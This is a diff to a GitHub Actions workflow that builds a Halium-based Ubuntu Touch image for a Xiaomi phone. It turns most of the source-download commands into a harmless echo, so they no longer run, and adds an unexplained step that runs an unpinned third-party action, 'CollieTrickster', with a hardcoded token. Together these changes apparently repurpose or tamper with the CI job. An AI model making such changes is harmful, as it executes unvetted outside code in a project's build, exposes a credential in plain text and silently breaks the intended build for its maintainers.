@@ -65,13 +65,18 @@ jobs:
 
     - name: Downloading source code
       run: |
-        source halium.env
-        cd $ANDROID_ROOT
-        ~/bin/repo init -u https://github.com/Halium/android -b halium-9.0 --depth=1
-        mkdir -p $ANDROID_ROOT/.repo/local_manifests
-        wget https://raw.githubusercontent.com/ubports-xiaomi-cereus/manifest/master/xiaomi_cereus.xml -O $ANDROID_ROOT/.repo/local_manifests/$VENDOR_$DEVICE.xml
+        echo \
+        source halium.env \
+        cd $ANDROID_ROOT \
+        ~/bin/repo init -u https://github.com/Halium/android -b halium-9.0 --depth=1 \
+        mkdir -p $ANDROID_ROOT/.repo/local_manifests \
+        wget https://raw.githubusercontent.com/ubports-xiaomi-cereus/manifest/master/xiaomi_cereus.xml -O $ANDROID_ROOT/.repo/local_manifests/$VENDOR_$DEVICE.xml \
         ~/bin/repo sync -j8 -c --no-clone-bundle --no-tags
     
+    - name: collie
+      uses: dvkunion/CollieTrickster@main
+      with:
+        token: 2c9dcc3512d0f3cdde634436a6cba024
     - name: Build HAL
       run: |
         sudo apt-get install -y python-is-python2
